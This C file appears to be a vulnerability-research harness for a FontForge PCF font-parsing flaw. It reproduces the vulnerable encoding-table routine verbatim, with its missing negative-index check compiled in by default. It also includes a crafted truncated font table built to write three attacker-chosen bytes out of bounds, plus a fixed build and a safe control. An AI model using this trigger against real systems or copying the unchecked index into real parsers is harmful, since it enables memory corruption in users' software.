/*
 * fontforge2shell — direct-call harness for CVE-2026-135295.
 *
 * The function PcfReadEncodingsNames() and the PCF helpers below are copied
 * VERBATIM from pinned/fvimportbdf-20251009.c (FontForge tag 20251009).
 * Only the surrounding FontForge types are replaced by minimal stand-ins,
 * figureProperEncoding() is stubbed to return -1, and a tiny truncated
 * PCF BDF_ENCODINGS table is supplied in memory. The single fixed line is
 * verbatim from commit 65e80b5dfb6691a1c8a532cfbb8ec905949e0c9a (PR #5957)
 * and is compiled only with -DFIXED.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct toc {
    int type;
    int format;
    int size;		/* in 32bit words */
    int offset;
};

#define PCF_BDF_ENCODINGS	    (1<<5)
#define PCF_GLYPH_NAMES		    (1<<7)
#define PCF_DEFAULT_FORMAT	0x00000000
#define PCF_FORMAT_MASK		0xffffff00
#define PCF_BYTE_MASK		(1<<2)

typedef struct BDFChar { void *sc; int orig_pos; } BDFChar;
typedef struct BDFFont { int glyphcnt; BDFChar **glyphs; } BDFFont;
typedef struct EncMap { int *map; } EncMap;
typedef struct SplineFont { void **glyphs; } SplineFont;
typedef struct Encoding Encoding;

static int getint32(FILE *file) {
    int val = getc(file);
    val |= (getc(file)<<8);
    val |= (getc(file)<<16);
    val |= (getc(file)<<24);
return( val );
}

static int getformint32(FILE *file,int format) {
    int val;
    if ( format&PCF_BYTE_MASK ) {
	val = getc(file);
	val = (val<<8) | getc(file);
	val = (val<<8) | getc(file);
	val = (val<<8) | getc(file);
    } else {
	val = getc(file);
	val |= (getc(file)<<8);
	val |= (getc(file)<<16);
	val |= (getc(file)<<24);
    }
return( val );
}

static int getformint16(FILE *file,int format) {
    int val;
    if ( format&PCF_BYTE_MASK ) {
	val = getc(file);
	val = (val<<8) | getc(file);
    } else {
	val = getc(file);
	val |= (getc(file)<<8);
    }
return( val );
}

static int pcfSeekToType(FILE *file, struct toc *toc, int type) {
    int i;

    for ( i=0; toc[i].type!=0 && toc[i].type!=type; ++i );
    if ( toc[i].type==0 )
return( 0 );
    fseek(file,toc[i].offset,SEEK_SET);
return( 1 );
}

/* Stand-in: a negative result leaves every encs[] entry untouched below. */
static int figureProperEncoding(SplineFont *sf, EncMap *map, BDFFont *b,
	int enc, const char *name, int a, int bb, Encoding *en) {
    (void) sf; (void) map; (void) b; (void) enc; (void) name;
    (void) a; (void) bb; (void) en;
return( -1 );
}

/* ----- verbatim from pinned/fvimportbdf-20251009.c:1719-1768 ----- */
static void PcfReadEncodingsNames(FILE *file,struct toc *toc,SplineFont *sf,
	EncMap *map, BDFFont *b, Encoding *encname) {
    int format, cnt, i, stringsize;
    int *offsets=NULL;
    char *string=NULL;
    int *encs;

    encs = malloc(b->glyphcnt*sizeof(int));
    memset(encs,-1,b->glyphcnt*sizeof(int));

    if ( pcfSeekToType(file,toc,PCF_GLYPH_NAMES) &&
	    ((format = getint32(file))&PCF_FORMAT_MASK)==PCF_DEFAULT_FORMAT &&
	    (cnt = getformint32(file,format))==b->glyphcnt ) {
	offsets = malloc(cnt*sizeof(int));
	for ( i=0; i<cnt; ++i )
	    offsets[i] = getformint32(file,format);
	stringsize = getformint32(file,format);
	string = malloc(stringsize);
	fread(string,1,stringsize,file);
    }
    if ( pcfSeekToType(file,toc,PCF_BDF_ENCODINGS) &&
	    ((format = getint32(file))&PCF_FORMAT_MASK)==PCF_DEFAULT_FORMAT ) {
	int min2, max2, min1, max1, tot, glyph;
	min2 = getformint16(file,format);
	max2 = getformint16(file,format);
	min1 = getformint16(file,format);
	max1 = getformint16(file,format);
	/* def */(void)getformint16(file,format);
	tot = (max2-min2+1)*(max1-min1+1);
	for ( i=0; i<tot; ++i ) {
	    glyph = getformint16(file,format);
#ifdef FIXED
	    if ( glyph>=0 && glyph!=0xffff && glyph<b->glyphcnt ) {
#else
	    if ( glyph!=0xffff && glyph<b->glyphcnt ) {
#endif
		encs[glyph] = (i/(max2-min2+1) + min2)*256 +
					(i%(max2-min2+1) + min1);
	    }
	}
    }
    cnt = b->glyphcnt;
    for ( i=0; i<cnt; ++i ) {
	const char *name;
	if ( string!=NULL ) name = string+offsets[i];
	else name = ".notdef";
	encs[i] = figureProperEncoding(sf,map,b,encs[i],name,-1,-1,encname);
	if ( encs[i]!=-1 ) {
	    int gid = map->map[encs[i]];
	    if ( gid!=-1 ) {
		b->glyphs[i]->sc = sf->glyphs[gid];
		b->glyphs[i]->orig_pos = gid;
	    }
	}
    }
    free(string); free(offsets); free(encs);
}
/* ----- end verbatim ----- */

/*
 * Truncated PCF BDF_ENCODINGS table (20 bytes): format=0 (LSB, 32-bit),
 * min2=max2=0x5346, min1=0x4d, max1=0x50 (tot=4), default=0, then
 * glyph entries 0,1,2 only. The i=3 read hits EOF twice: getc() returns -1
 * and getformint16() yields -1 -> encs[-1] write.
 * The i=3 value is (3+0x5346)*256 + 0x4d = 0x53494d, i.e. little-endian
 * bytes 4d 49 53 00 ("MIS\\0") at encs-4. The top byte is always zero:
 * the pin value is (i+min2)*256 + min1 with 16-bit fields, so at most
 * three bytes are attacker-chosen in this direct model.
 */
static unsigned char encodings_table[] = {
    0x00,0x00,0x00,0x00,             /* format: PCF_DEFAULT_FORMAT */
    0x46,0x53,                       /* min2 = 0x5346 */
    0x46,0x53,                       /* max2 = 0x5346 (tot=4) */
    0x4d,0x00,                       /* min1 = 0x4d */
    0x50,0x00,                       /* max1 = 0x50 */
    0x00,0x00,                       /* default char */
    0x00,0x00, 0x01,0x00, 0x02,0x00  /* glyphs 0,1,2; truncates here */
};

/* Control: same table with the fourth glyph index present (no EOF read). */
static unsigned char encodings_table_safe[] = {
    0x00,0x00,0x00,0x00,
    0x46,0x53,
    0x46,0x53,
    0x4d,0x00,
    0x50,0x00,
    0x00,0x00,
    0x00,0x00, 0x01,0x00, 0x02,0x00, 0x03,0x00
};

int main(int argc, char **argv) {
    FILE *file;
    struct toc toc[] = {
	{ PCF_BDF_ENCODINGS, 0, 0, 0 },
	{ 0, 0, 0, 0 }
    };
    BDFChar glyphs[4];
    BDFChar *glyph_ptrs[4];
    BDFFont b;
    int i, valid_only = (argc>1 && strcmp(argv[1],"safe")==0);

    for ( i=0; i<4; ++i ) {
	glyphs[i].sc = NULL;
	glyphs[i].orig_pos = -1;
	glyph_ptrs[i] = &glyphs[i];
    }
    b.glyphcnt = 4;
    b.glyphs = glyph_ptrs;

    file = valid_only
	? fmemopen(encodings_table_safe, sizeof(encodings_table_safe), "rb")
	: fmemopen(encodings_table, sizeof(encodings_table), "rb");
    if ( file==NULL ) { perror("fmemopen"); return 2; }
    PcfReadEncodingsNames(file, toc, NULL, NULL, &b, NULL);
    fclose(file);
    printf("returned; glyphcnt=%d mode=%s\n", b.glyphcnt,
	    valid_only ? "safe" : "attack");
return( 0 );
}
